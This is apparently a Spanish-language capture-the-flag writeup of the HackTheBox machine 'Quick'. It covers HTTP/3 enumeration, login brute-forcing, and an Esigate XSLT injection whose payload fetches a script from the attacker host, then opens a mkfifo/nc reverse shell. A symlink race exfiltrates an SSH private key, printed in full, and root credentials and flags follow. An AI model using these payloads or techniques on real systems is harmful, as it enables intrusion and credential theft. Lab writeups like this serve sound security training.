---
layout      : post
title       : "Maquina Quick - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Quick/banner.png
category    : [ hackthebox ]
tags        : [ http3, Information leaked, Bruteforce, XSS Injection Esigate, change password db, Abusing Printer]
---

El dia de hoy vamos a estar resolviendo `Quick` de `hackthebox` una maquina potente `linux` de dificultad hard, donde vamos a estar obtener informacion a traves del `http3` compilando una version de `curl`, con la información obtenida vamos a computar correos para mediante fuerza bruta ganar acceso a un pandel de tickets donde explotaremos una vulnerabilidad en `esigate` que nos permitira realizar `RCE` para ganar acceso al sistema. En la parte de elevación de privilegios nos aprovecharemos de la mala configuración de una impresora, para secuestrar el contenido que imprime y modificarlo para obtener información y migrar a otro usuario y ya como este podremos leer el contenido de un archivo de configuración que nos dara las credenciales del usuario `root`.
 
Es una maquina bastante entretenida asi que a darle!.


Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Quick
❯ ls
 Quick
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## Enumeración [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.186
PING 10.10.10.186 (10.10.10.186) 56(84) bytes of data.
64 bytes from 10.10.10.186: icmp_seq=1 ttl=63 time=118 ms

--- 10.10.10.186 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 117.913/117.913/117.913/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `127`correspondiente a una maquina `windows`, ahora procederemos a el escaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.186 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:46 GMT
Initiating SYN Stealth Scan at 21:46
Scanning 10.10.10.186 [65535 ports]
Discovered open port 22/tcp on 10.10.10.186
Discovered open port 9001/tcp on 10.10.10.186
Completed SYN Stealth Scan at 21:47, 17.10s elapsed (65535 total ports)
Nmap scan report for 10.10.10.186
Host is up, received user-set (0.14s latency).
Scanned at 2023-06-16 21:46:51 GMT for 17s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
9001/tcp open  tor-orport syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds
           Raw packets sent: 83322 (3.666MB) | Rcvd: 83310 (3.332MB)
```

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p22,9001 10.10.10.186 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:48 GMT
Nmap scan report for 10.10.10.186
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Quick | Broadband Services
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.12 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 21     | SSH     | OpenSSH 7.6p1  |
| 9001   | HTTP     |  Apache httpd 2.4.29 |


## Explotación [#](#explotación) {#explotación}


Utilizaremos `whatweb` para identificar las tecnoligias que emplea el servicio web de la maquina en el puerto `9001`.


```bash
❯ whatweb http://10.10.10.186:9001
http://10.10.10.186:9001 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.186], Script, Title[Quick | Broadband Services], Via-Proxy[1.1 localhost (Apache-HttpClient/4.5.2 (cache))], X-Powered-By[Esigate]
```

Vemos que el servicio corresponde a un `Esigate`.

> Esigate: ESIGate permite una integración transparente y eficiente entre todas las aplicaciones Web. Por ejemplo, agregue a un CMS (Sistema de gestión de contenidos) módulos desarrollados en cualquier lenguaje (PHP, Java, . Net...) sin problemas de caché o de accesibilidad.


Abrimos el servicio en el navegador y vemos un mensaje `update`, donde nos comenta que se esta utilizando la ultima versión de `http`, que corresponde a `http3`, ademas tambien podemos ver una lista de usuarios.

![](/assets/images/HTB/htb-writeup-Quick/quick1.PNG)


Si vamos al enlace de `clientes`, obtenemos mas información de los usuarios como la empresa y pais a la cual pertenecen.

![](/assets/images/HTB/htb-writeup-Quick/quick2.PNG)


Volviendo a la pagina principal, haciendo hovering en `portal` obtenemos que se nos redirige a otro subdominio, el cual añadiremos a nuestro `/etc/hosts`.

```bash
❯ echo "10.10.10.186 quick.htb portal.quick.htb" >> /etc/hosts
```

Vemos que no podemos visualizar la pagina, aun agregando los subdominios.

![](/assets/images/HTB/htb-writeup-Quick/quick3.PNG)


Investigando un poco del `http3`, vemos que la nueva versión de `http3` sera la que deje de usar el protocolo `TCP` y lo reemplazara por uno nuevo de nombre `Quick`. Curiosamente similar al nombre de la maquina.

Puedes ver mas detalles en el siguiente articulo.

* [https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido](https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido)


Para poder usar esta versión experimental, vamos a recompilar una versión de `curl`, del siguiente repositorio:

* [https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version](https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version)

Para efectos practicos ejecutando los siguientes comandos podremos obtener el binario funcional.

![](/assets/images/HTB/htb-writeup-Quick/quick4.PNG)


Una vez lo tengamos correctamente instalado, ejecutamos y esta vez si podemos ver la pagina, la cual nos expone algunas rutas.

```bash

❯ ./src/.libs/curl -s --http3 "https://portal.quick.htb/" -k
<html>
  <ul>
    <li><a href="index.php">Home</a></li>
    <li><a href="index.php?view=contact">Contact</a></li>
    <li><a href="index.php?view=about">About</a></li>
    <li><a href="index.php?view=docs">References</a></li>
  </ul>
</html>
```

Encontramos nuevos usuarios en la ruta `about` y usamos `html2text` para moestrarlo estetico en consola.

```bash
❯ ./src/.libs/curl -s --http3 "https://portal.quick.htb/?view=about" -k | html2text
****** Quick | About Us ******
***** Our Team *****
[Jane]
***** Jane Doe *****
CEO & Founder
Quick Broadband services established in 2012 by Jane.
jane@quick.htb
[Mike]
***** Mike Ross *****
Sales Manager
Manages the sales and services.
mike@quick.htb
[John]
***** John Doe *****
Web Designer
Front end developer.
john@quick.htb
```

Encontramos un `pdf`, donde podemos obtener una contraseña `Quick4cc3$$`.

```bash
./src/.libs/curl --http3 "https://portal.quick.htb/docs/QuickStart.pdf" -k --output QuickStart.pdf
```
![](/assets/images/HTB/htb-writeup-Quick/quick5.PNG)


Nos dirigimos al panel principal y vamos al enlace `Get Started`, que nos redirige a un panel de logeo.

![](/assets/images/HTB/htb-writeup-Quick/quick6.PNG)


Contamos con una contraseña, pero recordemos que anteriormente obtuvimos una lista de usuarios. Como el panel de logeo nos pide un email valido, vamos a crearnos un diccionario con los usuarios que obtuvimos, y ya que tambien se nos filtro la compañia y pais de origen de cada uno, podemos computar posibles correos a partir de estos datos.


```bash
❯ cat users.txt
tim@qconsulting.co.uk
tim@qconsulting.co
tim@qconsulting.uk
tim@qconsulting.com
tim@quick.htb
roy@darkwng.us
roy@quick.htb
roy@darkwng.com
elisa@wink.uk
elisa@wink.co.uk
elisa@quick.htb
elisa@wink.com
james@lazycoop.cn
james@lazycoop.com
james@quick.htb
mike@quick.htb
jane@quick.htb
jhon@quick.htb
```

Ahora mediante fuerza bruta trataremos de encontrar una credencial valida, para ello usaremos `wfuzz`.


```bash
❯ wfuzz -c --hc=404 -t 50 -w $(pwd)/users.txt -d 'email=FUZZ&password=Quick4cc3$$' "http://10.10.10.186:9001/login.php"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.186:9001/login.php
Total requests: 18

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000003:   200        0 L      2 W        80 Ch       "tim@qconsulting.uk"                                                                                                  
000000007:   200        0 L      2 W        80 Ch       "roy@quick.htb"                                                                                                       
000000015:   200        0 L      2 W        80 Ch       "james@quick.htb"                                                                                                     
000000014:   200        0 L      2 W        80 Ch       "james@lazycoop.com"                                                                                                  
000000001:   200        0 L      2 W        80 Ch       "tim@qconsulting.co.uk"                                                                                               
000000012:   200        0 L      2 W        80 Ch       "elisa@wink.com"                                                                                                      
000000016:   200        0 L      2 W        80 Ch       "mike@quick.htb"                                                                                                      
000000013:   200        0 L      2 W        80 Ch       "james@lazycoop.cn"                                                                                                   
000000018:   200        0 L      2 W        80 Ch       "jhon@quick.htb"                                                                                                      
000000017:   200        0 L      2 W        80 Ch       "jane@quick.htb"                                                                                                      
000000006:   200        0 L      2 W        80 Ch       "roy@darkwng.us"                                                                                                      
000000010:   302        0 L      0 W        0 Ch        "elisa@wink.co.uk"                                                                                                    
000000011:   200        0 L      2 W        80 Ch       "elisa@quick.htb"                                                                                                     
000000009:   200        0 L      2 W        80 Ch       "elisa@wink.uk"                                                                                                       
000000002:   200        0 L      2 W        80 Ch       "tim@qconsulting.co"                                                                                                  
000000005:   200        0 L      2 W        80 Ch       "tim@quick.htb"                                                                                                       
000000008:   200        0 L      2 W        80 Ch       "roy@darkwng.com"                                                                                                     
000000004:   200        0 L      2 W        80 Ch       "tim@qconsulting.com"                                                                                                 
```

Vemos que uno nos reporta un codigo de estado `302`, validamos las credenciales y ganamos acceso a un panel de generación de `tickets`.


![](/assets/images/HTB/htb-writeup-Quick/quick7.PNG)


Anteriormente vimos que el servicio web, usaba `esigate` y buscando vulnerabilidades asociadas encontramos que podemos hace una inyección para obtener `RCE a traves de XSLT`.


Dejo el siguiente articulo si quieres saber a detalle en que consiste la vulnerabilidad y su explotación paso a paso.

* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)


Para explotar vamos a crear dos archivo con extension `xml y xsl`, con el mismo contenido, donde en la opción `CDATA` inyectaremos el codigo que queremos ejecutar.

```xml
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[wget http://10.10.16.4/shell]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```

Asi mismo como vamos a hacer una petición a un archivo de nuestra maquina de nombre `shell`, vamos a introducir dentro de este un codigo en bash que nos permita obtener una rever shell.

```bash
❯ cat shell
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Lo siguiente sera ejecutar el siguiente codigo en la opción de `raise ticket`, donde realizaremos una petición a los archivos previamente creados.


```xml
<esi:include src="http://10.10.16.4/a.xml" stylesheet="http://10.10.16.4/a.xsl">
</esi:include>
```

![](/assets/images/HTB/htb-writeup-Quick/quick13.PNG)


Se nos generara un codigo de ticket.

![](/assets/images/HTB/htb-writeup-Quick/quick8.PNG)

Buscamos el ticket en la ruta `search.php`.


![](/assets/images/HTB/htb-writeup-Quick/quick9.PNG)


Y en consecuencia recibimos la petición, que indica que se subio nuestro archivo `shell` a la maquina victima. 

```python
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.186 - - [16/Jun/2023 23:40:17] "GET /a.xsl HTTP/1.1" 200 -
10.10.10.186 - - [16/Jun/2023 23:40:17] "GET /a.xml HTTP/1.1" 200 -
10.10.10.186 - - [16/Jun/2023 23:40:18] "GET /shell HTTP/1.1" 200 -
```

Ahora debemos hacer el mismo proceso, pero esta vez modificaremos nuestros archivos con el comando inyectado en `CDATA` por `bash shell`, para que se ejecute nuestro archivo.

Para evitar problemas en esta segunda petición modifiquemos el nombre de los archivos `xml y xsl`.

```xml
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
  <xsl:variable name="cmd"><![CDATA[bash shell]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```

Realizamos la misma ejecución.

![](/assets/images/HTB/htb-writeup-Quick/quick12.PNG)


![](/assets/images/HTB/htb-writeup-Quick/quick11.PNG)

Nos genera otro nuevo ticket que al buscarlo nuevamente en la ruta `search.php`, ejecuta el archivo dandonos acceso al sistema como el usuario `sam`.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.186 - - [17/Jun/2023 00:04:41] "GET /c.xsl HTTP/1.1" 200 -
10.10.10.186 - - [17/Jun/2023 00:04:42] "GET /c.xml HTTP/1.1" 200 -
```

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:38672.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
sam
$ 
```

Como es de costumbre, ahora ganaremos acceso con una `tty full interactive`.


```bash
$ script /dev/null -c bash
Script started, file is /dev/null
sam@quick:~$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
sam@quick:~$ export TERM=xterm
sam@quick:~$ export SHELL=bash
sam@quick:~$ stty rows 45 columns 184
```

Nos dirigimos al directorio personal del usuario `sam` y visualizamos la primera flag `user.txt`.

```bash
sam@quick:~$ ls
esigate-distribution-5.2  shell  user.txt
sam@quick:~$ cat user.txt 
359179c57000cd4aa582740c4a637cc6
```


Ya que el servicio corre en un `apache`, visualizamos el archivo de configuración y encontramos un nuevo subdominio `printerv2.quick.htb`, correspondiente a otro panel de logeo.


```bash
sam@quick:~$ 2cat /etc/apache2/sites-enabled/000-default.conf 
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>
<VirtualHost *:80>
	AssignUserId srvadm srvadm
	ServerName printerv2.quick.htb
	DocumentRoot /var/www/printer
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

Procemos a añadir el nuevo subdominio a nuestro `/etc/hosts`.


```bash
❯ echo "10.10.10.186 printerv2.quick.htb" >> /etc/hosts
```

![](/assets/images/HTB/htb-writeup-Quick/quick14.PNG)


Enumerando el sistema, encontramos un archivo con las credenciales de la base de datos.


```bash
sam@quick:/var/www/html$ ls
clients.php  db.php  home.php  index.php  login.php  search.php  ticket.php
sam@quick:/var/www/html$ cat db.php 
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>
```

Procemos a enumerar la base de datos y vemos las contraseñas hasheadas de los usuarios.

```sql
sam@quick:/var/www/html$ mysql -udb_adm -pdb_p4ss -D quick
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 128
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
+-----------------+
| Tables_in_quick |
+-----------------+
| jobs            |
| tickets         |
| users           |
+-----------------+
3 rows in set (0.00 sec)

mysql> describe users;
+----------+---------------+------+-----+---------+-------+
| Field    | Type          | Null | Key | Default | Extra |
+----------+---------------+------+-----+---------+-------+
| name     | varchar(100)  | YES  |     | NULL    |       |
| email    | varchar(100)  | YES  |     | NULL    |       |
| password | varchar(1000) | YES  |     | NULL    |       |
+----------+---------------+------+-----+---------+-------+
3 rows in set (0.00 sec)

mysql> select email, password from users;
+------------------+----------------------------------+
| email            | password                         |
+------------------+----------------------------------+
| elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+------------------+----------------------------------+
2 rows in set (0.00 sec)
```

Probamos a tratar de crackear los hashes pero no nos resulta posible, pero debemos recordar que al ser el usuario `db_adm`, podemos tener algunos privilegios entre ellos el de modificar las credenciales. 

Para ello como ya contamos con la password de `elisa`, vamos a modificar a tratar de modificar la password del usuario `srvadm`, de tal modo que sea la misma.

```sql
mysql> update users set password="c6c35ae1f3cb19438e0199cfa72a9d9d" where email="srvadm@quick.htb";
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql>
```

Nos conectamos exitosamente con las nuevas credenciales `srvadm@quick.htb:Quick4cc3$$` y ganamos acceso a una aplicación de impresoras.

![](/assets/images/HTB/htb-writeup-Quick/quick15.PNG)


## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si seleccionamos la opción `add printer`, vemos que se establece una conexión al puerto `9100` y si ingresamos nuestra ip, recibimos una conexión al imprimir.

![](/assets/images/HTB/htb-writeup-Quick/quick16.PNG)


```bash
❯ ncat -nlvp 9100
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:44216.
```

Al continuar enumerando el sistema, encontramos un archivo de nombre `job.php`, el cual crea un archivo con nombre de la fecha actual y lo almance en la ruta `/var/www/jobs` con el contenido que ingresamos en `bill details` en jobs.

![](/assets/images/HTB/htb-writeup-Quick/quick17.PNG)

Tambien podemos observar que despues genera una conexión a una ip y puerto especifico, donde envia dicho contenido. Pero vemos algo muy interesante ya que en el proceso se ejecuta un `sleep(0.5)` de medio segundo.


```php
<?php
require __DIR__ . '/escpos-php/vendor/autoload.php';
use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;
use Mike42\Escpos\Printer;
include("db.php");
session_start();

if($_SESSION["loggedin"])
{
	if(isset($_POST["submit"]))
	{
		$title=$_POST["title"];
		$file = date("Y-m-d_H:i:s");
		file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
		chmod("/var/www/printer/jobs/".$file,"0777");
		$stmt=$conn->prepare("select ip,port from jobs");
		$stmt->execute();
		$result=$stmt->get_result();
		if($result->num_rows > 0)
		{
			$row=$result->fetch_assoc();
			$ip=$row["ip"];
			$port=$row["port"];
			try
			{
				$connector = new NetworkPrintConnector($ip,$port);
				sleep(0.5); //Buffer for socket check
				$printer = new Printer($connector);
				$printer -> text(file_get_contents("/var/www/jobs/".$file));
				$printer -> cut();
				$printer -> close();
				$message="Job assigned";
				unlink("/var/www/jobs/".$file);
			}
			catch(Exception $error) 
			{
				$error="Can't connect to printer.";
				unlink("/var/www/jobs/".$file);
			}
		}
		else
		{
			$error="Couldn't find printer.";
		}
	}

?>
```
![](/assets/images/HTB/htb-writeup-Quick/quick18.PNG)


Podemos aprovecharnos de este `sleep`, para poder crearnos un archivo con el nombre de la fecha actual, y cuando se ejecute el `sleep` puedo secuestrar el contenido original para crear un link simbolico que apunte a la clave `id_rsa` del usuario `srvadm`.

Para ello ejecutare la siguente instrucción.

```bash
sam@quick:/var/www/printer$ while true; do fecha=$(date +%F_%H:%M:%S); if [ -r $fecha ]; then ln -s -f /home/srvadm/.ssh/id_rsa $fecha; break; fi; done
```

Me pondre en escucha por el puerto `9100` y agregare un contenido en `bill details`.

![](/assets/images/HTB/htb-writeup-Quick/quick19.PNG)


Recibimos con exito la clave `id_rsa` del usuario `srvadm`

```bash
❯ ncat -nlvp 9100
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:44256.
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
-----END RSA PRIVATE KEY-----
VA#            
```


Ahora nos conectamos como el usario `srvadm`.

```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa srvadm@10.10.10.186
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 17 01:32:15 UTC 2023

  System load:  0.18              Users logged in:                0
  Usage of /:   73.4% of 7.75GB   IP address for ens33:           10.10.10.186
  Memory usage: 17%               IP address for docker0:         172.17.0.1
  Swap usage:   0%                IP address for br-9ef1bb2e82cd: 172.18.0.1
  Processes:    191


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

52 packages can be updated.
27 updates are security updates.


Last login: Fri Mar 20 05:56:02 2020 from 172.16.118.129
srvadm@quick:~$ whoami
srvadm
```

Dentro los dos directios del usuario `srvadm`, encontramos un archivo de configuración y al leerlo encontramos unas credenciales.

```bash
srvadm@quick:~/.cache$ find .
.
./conf.d
./conf.d/printers.conf
./conf.d/cupsd.conf
./logs
./logs/debug.log
./logs/error.log
./logs/cups.log
./packages
./motd.legal-displayed
srvadm@quick:~/.cache$ cat ./conf.d/printers.conf
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
State Idle
```

Si ahora lo urldecodeamos para verlo mejor obtenemos unas nuevas credenciales que corresponden al usuario `root`.


```bash
❯ php --interactive
Interactive mode enabled

php > echo urldecode("MakeModel KONICA MINOLTA C554SeriesPS(P)
php " DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
php " State Idle");
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb/printer
State Idle
```

Lo unico que tenemos que hacer ahora es dirigirnos al directorio del usuario `root` y visualizar la segunda flag `root.txt`.

```bash
srvadm@quick:~/.cache$ su root
Password: 
root@quick:/home/srvadm/.cache# whoami
root
root@quick:/home/srvadm/.cache# cd /root/
root@quick:~# cat root.txt 
914fef2cca09448887142468da0f2136
```

Maquina bastante guapa! 😃



